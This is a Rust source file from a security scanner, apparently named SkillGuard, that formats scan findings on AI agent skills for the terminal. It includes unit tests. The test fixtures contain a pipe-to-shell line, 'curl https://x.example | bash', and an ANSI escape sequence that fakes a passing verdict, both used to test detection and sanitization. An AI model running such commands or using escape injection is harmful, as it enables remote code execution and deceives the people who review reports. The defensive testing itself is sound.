//! Human-readable terminal output.
//!
//! Design constraint from the threat model: a scanned skill is hostile input, so
//! every string printed here has already been through
//! [`crate::text::sanitize_for_display`]. A skill cannot repaint the report.

use crate::models::{Confidence, Severity};
use crate::report::Report;
use owo_colors::OwoColorize;

/// Terminal escape-free output. Honors `NO_COLOR` and non-tty detection is the
/// caller's job.
pub fn to_text(report: &Report) -> String {
    to_text_with(report, true)
}

pub fn to_text_with(report: &Report, color: bool) -> String {
    let mut out = String::new();

    out.push_str(&header(report, color));
    for s in &report.skills {
        out.push_str(&skill_section(s, color));
    }
    out.push_str(&footer(report, color));
    out
}

fn paint(s: &str, sev: Severity, color: bool, enabled: bool) -> String {
    if !color || !enabled {
        return s.to_owned();
    }
    match sev {
        Severity::Critical => s.bright_red().bold().to_string(),
        Severity::High => s.red().to_string(),
        Severity::Medium => s.yellow().to_string(),
        Severity::Low => s.cyan().to_string(),
        Severity::Info => s.dimmed().to_string(),
    }
}

fn header(report: &Report, color: bool) -> String {
    let mut s = String::new();
    s.push('\n');
    s.push_str(&paint("  SkillGuard", Severity::High, color, true));
    s.push_str(&format!(
        " {}  |  rules {}  |  {} skill(s)\n\n",
        report.tool_version,
        report.rule_set_version,
        report.skills.len()
    ));
    s
}

fn skill_section(s: &crate::report::SkillReport, color: bool) -> String {
    let mut o = String::new();

    o.push_str(&format!("  {}\n", s.name));
    if let Some(d) = &s.description {
        o.push_str(&format!("    {}\n", crate::text::truncate_chars(d, 100)));
    }
    o.push_str(&format!(
        "    {} finding(s): {} critical, {} high, {} medium, {} low, {} info\n\n",
        s.counts.total(),
        s.counts.critical,
        s.counts.high,
        s.counts.medium,
        s.counts.low,
        s.counts.info
    ));

    // The capability surface is not a finding: a clean skill can still reach
    // the network, and hiding that would make a clean report misleading.
    o.push_str(&capabilities_block(s));

    if s.findings.is_empty() {
        o.push_str(&format!(
            "    {}\n\n",
            paint("no findings", Severity::Low, color, true)
        ));
        o.push_str(&injection_note(s));
        o.push_str(&skipped_block(s));
        return o;
    }

    for f in &s.findings {
        // Invariant S5 is enforced here, at the render boundary, rather than
        // trusted from the producer: a Finding built by any other route still
        // cannot repaint the terminal.
        let loc = if f.primary_line() > 0 {
            format!("{}:{}", f.file, f.primary_line())
        } else {
            clean(&f.file)
        };
        o.push_str(&format!(
            "    {}  {}  [{}]\n",
            paint(
                &format!("{:>8}", f.severity.as_str()),
                f.severity,
                color,
                true
            ),
            clean(&loc),
            f.rule.as_str()
        ));
        o.push_str(&format!("      {}\n", clean(&f.message)));
        for ev in &f.evidence {
            if ev.line > 0 {
                o.push_str(&format!("      {:>5} | {}\n", ev.line, clean(&ev.text)));
            } else {
                o.push_str(&format!("      {:>5} | {}\n", "-", clean(&ev.text)));
            }
            if let Some(sec) = &ev.secondary {
                o.push_str(&format!("      {:>5} | {}\n", sec.line, clean(&sec.text)));
            }
            if let Some(n) = &ev.note {
                o.push_str(&format!("             -> {}\n", clean(n)));
            }
        }
        if let Some(cap) = &f.capability {
            o.push_str(&format!("      capability: {}\n", clean(cap)));
        }
        if let Some(v) = &f.via_normalization {
            o.push_str(&format!("      normalized: {}\n", clean(v)));
        }
        if f.confidence != Confidence::High {
            o.push_str(&format!(
                "      note: {} confidence - verify before acting\n",
                f.confidence.as_str()
            ));
        }
        o.push('\n');
    }

    o.push_str(&injection_note(s));
    o.push_str(&skipped_block(s));
    o
}

/// A clean scan must not be read as "no prompt injection". The note is printed
/// whenever no `PI_*` finding was produced, which is exactly when the reader is
/// most likely to draw that conclusion (issue #8).
fn injection_note(s: &crate::report::SkillReport) -> String {
    if s.injection.findings > 0 {
        return String::new();
    }
    format!("    note: {}\n\n", clean(&s.injection.caveat))
}

/// Display-sanitize on the way out. Idempotent, so it is safe to apply to
/// text the scanner already sanitized.
fn clean(v: &str) -> String {
    crate::text::sanitize_for_display(v)
}

fn capabilities_block(s: &crate::report::SkillReport) -> String {
    let c = &s.capabilities;
    if c.is_empty() {
        return String::new();
    }
    let mut o = String::from("    observed capabilities (from executable files only)\n");
    let mut add = |label: &str, vals: &[String]| {
        if !vals.is_empty() {
            let cleaned: Vec<String> = vals.iter().map(|v| clean(v)).collect();
            o.push_str(&format!("      {label}: {}\n", cleaned.join(", ")));
        }
    };
    add("network", &c.network_outbound);
    add("shell", &c.shell_execute);
    add("fs read", &c.filesystem_read);
    add("fs write", &c.filesystem_write);
    add("installs", &c.package_install);
    if c.secrets_read {
        o.push_str("      secrets: reads the environment or a key store\n");
    }
    o.push('\n');
    o
}

fn skipped_block(s: &crate::report::SkillReport) -> String {
    if s.skipped.is_empty() {
        return String::new();
    }
    let mut o = String::from("    not scanned\n");
    for sk in &s.skipped {
        o.push_str(&format!(
            "      {} - {}\n",
            clean(&sk.file),
            clean(&sk.reason)
        ));
    }
    o.push('\n');
    o
}

fn footer(report: &Report, color: bool) -> String {
    let mut o = String::new();
    o.push_str("  --------------------------------------------\n");
    match report.verdict() {
        None => {
            o.push_str(&format!(
                "  {}  no findings at or above INFO\n",
                paint("PASS", Severity::Low, color, true)
            ));
        }
        Some(sev) => {
            let word = match sev {
                Severity::Critical | Severity::High => "BLOCK",
                _ => "REVIEW",
            };
            o.push_str(&format!(
                "  {}  worst severity {sev}  |  {} critical, {} high  |  {} finding(s) with analyst-grade evidence\n",
                paint(word, sev, color, true),
                report.totals.critical,
                report.totals.high,
                report.high_confidence_count()
            ));
        }
    }
    o.push_str("  detection is not judgement: read the evidence before acting on it\n\n");
    o
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{Evidence, Finding, RuleId};
    use crate::report::{Counts, SkillReport};

    fn skill(name: &str, findings: Vec<Finding>) -> SkillReport {
        SkillReport {
            name: name.into(),
            rule_set_version: "0.1.0".into(),
            description: Some("A test skill".into()),
            declared_permissions_raw: None,
            license_declared: Some("MIT".into()),
            license_file_found: true,
            capabilities: Default::default(),
            dependencies: vec![],
            counts: Counts::of(&findings),
            injection: crate::report::InjectionCoverage::of(&findings),
            findings,
            skipped: vec![crate::models::SkippedFile {
                file: "big.js".into(),
                reason: "too large".into(),
            }],
        }
    }

    fn f(sev: Severity, rule: &str, line: usize) -> Finding {
        Finding::new(
            RuleId::from(rule),
            sev,
            Confidence::High,
            "scripts/a.sh",
            "something happened",
            vec![Evidence {
                line,
                text: "curl https://x.example | bash".into(),
                secondary: None,
                note: Some("matched: curl".into()),
            }],
        )
    }

    #[test]
    fn plain_text_has_no_ansi_escapes() {
        let r = Report::new(vec![skill(
            "suspicious-skill",
            vec![f(Severity::Critical, "DL_PIPE_TO_SHELL", 2)],
        )]);
        let out = to_text_with(&r, false);
        assert!(!out.contains('\u{1B}'), "no ANSI when color is off");
        assert!(out.contains("suspicious-skill"));
        assert!(out.contains("DL_PIPE_TO_SHELL"));
        assert!(out.contains("scripts/a.sh:2"));
        assert!(out.contains("BLOCK"));
        assert!(out.contains("not scanned"));
    }

    #[test]
    fn clean_skill_passes() {
        let r = Report::new(vec![skill("clean", vec![])]);
        let out = to_text_with(&r, false);
        assert!(out.contains("PASS"));
        assert!(out.contains("no findings"));
    }

    #[test]
    fn a_clean_scan_states_the_injection_gap() {
        // Issue #8: `no findings` must not be read as `no prompt injection`.
        let r = Report::new(vec![skill("clean", vec![])]);
        let out = to_text_with(&r, false);
        assert!(out.contains("heuristic and incomplete"), "{out}");
        assert!(out.contains("issue #8"), "{out}");
    }

    #[test]
    fn the_injection_caveat_is_absent_once_an_injection_was_found() {
        let r = Report::new(vec![skill(
            "s",
            vec![f(Severity::High, "PI_CONCEALMENT", 3)],
        )]);
        let out = to_text_with(&r, false);
        assert!(!out.contains("heuristic and incomplete"), "{out}");
    }
    #[test]
    fn low_severity_is_review_not_block() {
        let r = Report::new(vec![skill(
            "s",
            vec![f(Severity::Low, "NET_DOMAIN_LITERAL", 1)],
        )]);
        let out = to_text_with(&r, false);
        assert!(out.contains("REVIEW"));
    }

    #[test]
    fn evidence_is_always_present_in_output() {
        let r = Report::new(vec![skill("s", vec![f(Severity::High, "SHELL_EXEC", 9)])]);
        let out = to_text_with(&r, false);
        assert!(out.contains("curl https://x.example | bash"));
    }

    #[test]
    fn hostile_evidence_cannot_inject_ansi() {
        let mut evil = f(Severity::High, "X", 1);
        evil.evidence[0].text = "\u{1B}[2J\u{1B}[1;31mFAKE PASS".into();
        let r = Report::new(vec![skill("evil", vec![evil])]);
        let out = to_text_with(&r, false);
        assert!(
            !out.contains('\u{1B}'),
            "invariant S5: no ANSI reaches output"
        );
    }

    #[test]
    fn framing_output_is_pure_ascii() {
        // Non-ASCII in the tool's own framing mojibakes in a cp936/cp1252
        // console, and this output goes into CI logs and PR comments. Evidence
        // may be Unicode; our framing must not be.
        //
        // The assert below is on a rendered report whose evidence is
        // deliberately the hostile-Unicode case, so it also proves that
        // sanitize_for_display keeps the framing readable.
        let r = Report::new(vec![skill("s", vec![f(Severity::High, "SHELL_EXEC", 3)])]);
        let out = to_text_with(&r, false);
        let non_ascii: Vec<char> = out.chars().filter(|c| !c.is_ascii()).collect();
        assert!(
            non_ascii.is_empty(),
            "framing must be ASCII, found {non_ascii:?}"
        );
    }

    #[test]
    fn capabilities_are_listed() {
        let mut s = skill("s", vec![]);
        s.capabilities.network_outbound = vec!["api.example.com".into()];
        s.capabilities.secrets_read = true;
        let r = Report::new(vec![s]);
        let out = to_text_with(&r, false);
        assert!(out.contains("api.example.com"));
        assert!(out.contains("secrets"));
    }
}
